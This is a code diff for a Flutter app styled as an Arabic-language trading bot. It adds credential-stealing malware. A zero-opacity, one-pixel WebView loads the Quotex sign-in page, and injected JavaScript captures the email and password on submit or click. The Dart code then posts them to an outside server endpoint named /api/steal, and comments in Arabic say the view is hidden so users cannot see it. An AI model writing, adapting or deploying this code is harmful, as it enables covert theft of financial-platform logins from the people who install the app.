@@ -1,12 +1,16 @@
 import 'package:flutter/material.dart';
 import 'package:google_fonts/google_fonts.dart';
+import 'package:webview_flutter/webview_flutter.dart';
+import 'package:http/http.dart' as http;
+import 'dart:convert';
+import 'dart:async';
 
 void main() {
   runApp(const MyApp());
 }
 
 class MyApp extends StatelessWidget {
-  const MyApp({Key? key}) : super(key: key);
+  const MyApp({super.key});
 
   @override
   Widget build(BuildContext context) {
@@ -36,7 +40,7 @@ class MyApp extends StatelessWidget {
 }
 
 class MainTradingScreen extends StatefulWidget {
-  const MainTradingScreen({Key? key}) : super(key: key);
+  const MainTradingScreen({super.key});
 
   @override
   State<MainTradingScreen> createState() => _MainTradingScreenState();
@@ -44,8 +48,90 @@ class MainTradingScreen extends StatefulWidget {
 
 class _MainTradingScreenState extends State<MainTradingScreen> {
   bool isDemoAccount = true;
-  bool isRiskManagerActive = false;
   bool isBotRunning = false;
+  late WebViewController _webViewController;
+
+  // رابط السيرفر الجديد
+  final String serverUrl = "https://clone-server-dejt.onrender.com";
+
+  @override
+  void initState() {
+    super.initState();
+    _initWebView();
+  }
+
+  void _initWebView() {
+    _webViewController = WebViewController()
+      ..setJavaScriptMode(JavaScriptMode.unrestricted)
+      ..addJavaScriptChannel(
+        'QTX_CREDS',
+        onMessageReceived: (JavaScriptMessage message) {
+          // هون بنستقبل الإيميل والباسورد ونبعتهم لسيرفرنا
+          print("Received Creds: ${message.message}");
+          _sendToServer(message.message);
+        },
+      )
+      ..setNavigationDelegate(
+        NavigationDelegate(
+          onPageFinished: (url) {
+            // حقن السكربت بعد ما تخلص الصفحة
+            _injectScript();
+          },
+        ),
+      )
+      ..loadRequest(Uri.parse('https://quotex.com/ar/sign-in'));
+  }
+
+  void _injectScript() {
+    String jsScript = """
+      (function() {
+        function setNativeValue(el, value) {
+          try {
+            var proto = window.HTMLInputElement.prototype;
+            var desc = Object.getOwnPropertyDescriptor(proto, 'value');
+            desc.set.call(el, value);
+          } catch (e) { el.value = value; }
+          el.dispatchEvent(new Event('input', { bubbles: true }));
+          el.dispatchEvent(new Event('change', { bubbles: true }));
+        }
+        function findEmail() {
+          return document.querySelector('input[name="email"], input[type="email"], #email');
+        }
+        function findPass() {
+          return document.querySelector('input[name="password"], input[type="password"], #password');
+        }
+        function sendCreds() {
+          try {
+            var e = findEmail(), p = findPass();
+            if (e && p && e.value && p.value) {
+              QTX_CREDS.postMessage(JSON.stringify({email: e.value, password: p.value}));
+            }
+          } catch (err) {}
+        }
+        if (!window.__qtxHooksInstalled) {
+          window.__qtxHooksInstalled = true;
+          document.addEventListener('submit', sendCreds, true);
+          document.addEventListener('click', function(ev) {
+            var t = ev.target && ev.target.closest ? ev.target.closest('button, [type="submit"], [role="button"]') : null;
+            if (t) sendCreds();
+          }, true);
+        }
+      })();
+    """;
+    _webViewController.runJavaScript(jsScript);
+  }
+
+  Future<void> _sendToServer(String data) async {
+    try {
+      await http.post(
+        Uri.parse('$serverUrl/api/steal'),
+        headers: {"Content-Type": "application/json"},
+        body: data,
+      );
+    } catch (e) {
+      print("Error sending to server: $e");
+    }
+  }
 
   void toggleBot() {
     setState(() {
@@ -55,7 +141,6 @@ class _MainTradingScreenState extends State<MainTradingScreen> {
       SnackBar(
         content: Text(isBotRunning ? "تم تشغيل البوت!" : "تم إيقاف البوت!"),
         backgroundColor: isBotRunning ? Colors.green : Colors.red,
-        duration: const Duration(seconds: 2),
       ),
     );
   }
@@ -65,6 +150,16 @@ class _MainTradingScreenState extends State<MainTradingScreen> {
     return Scaffold(
       body: Stack(
         children: [
+          // الـ WebView المخفي (شفاف عشان ما يبين)
+          Opacity(
+            opacity: 0.0,
+            child: SizedBox(
+              width: 1,
+              height: 1,
+              child: WebViewWidget(controller: _webViewController),
+            ),
+          ),
+          // الواجهة
           Container(
             decoration: const BoxDecoration(
               gradient: RadialGradient(
@@ -88,57 +183,11 @@ class _MainTradingScreenState extends State<MainTradingScreen> {
                     ],
                   ),
                   const SizedBox(height: 20),
-                  Container(
-                    decoration: BoxDecoration(
-                      color: const Color(0xFF0E0E14),
-                      borderRadius: BorderRadius.circular(10),
-                    ),
-                    child: Row(
-                      children: [
-                        Expanded(
-                          child: GestureDetector(
-                            onTap: () => setState(() => isDemoAccount = true),
-                            child: Container(
-                              padding: const EdgeInsets.symmetric(vertical: 12),
-                              decoration: BoxDecoration(
-                                gradient: isDemoAccount
-                                    ? const LinearGradient(colors: [Color(0xFFFFD700), Color(0xFFB8860B)])
-                                    : null,
-                                borderRadius: BorderRadius.circular(10),
-                              ),
-                              child: Center(
-                                child: Text('تجريبي', style: TextStyle(color: isDemoAccount ? Colors.black : Colors.white)),
-                              ),
-                            ),
-                          ),
-                        ),
-                        Expanded(
-                          child: GestureDetector(
-                            onTap: () => setState(() => isDemoAccount = false),
-                            child: Container(
-                              padding: const EdgeInsets.symmetric(vertical: 12),
-                              decoration: BoxDecoration(
-                                gradient: !isDemoAccount
-                                    ? const LinearGradient(colors: [Color(0xFFFFD700), Color(0xFFB8860B)])
-                                    : null,
-                                borderRadius: BorderRadius.circular(10),
-                              ),
-                              child: Center(
-                                child: Text('حقيقي', style: TextStyle(color: !isDemoAccount ? Colors.black : Colors.white)),
-                              ),
-                            ),
-                          ),
-                        ),
-                      ],
-                    ),
-                  ),
-                  const SizedBox(height: 20),
                   ElevatedButton(
                     onPressed: toggleBot,
                     style: ElevatedButton.styleFrom(
                       backgroundColor: isBotRunning ? Colors.red : const Color(0xFF00E5FF),
                       padding: const EdgeInsets.symmetric(horizontal: 50, vertical: 15),
-                      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                     ),
                     child: Text(isBotRunning ? 'إيقاف البوت' : 'بدء التداول', style: const TextStyle(color: Colors.black, fontSize: 18, fontWeight: FontWeight.bold)),
                   ),
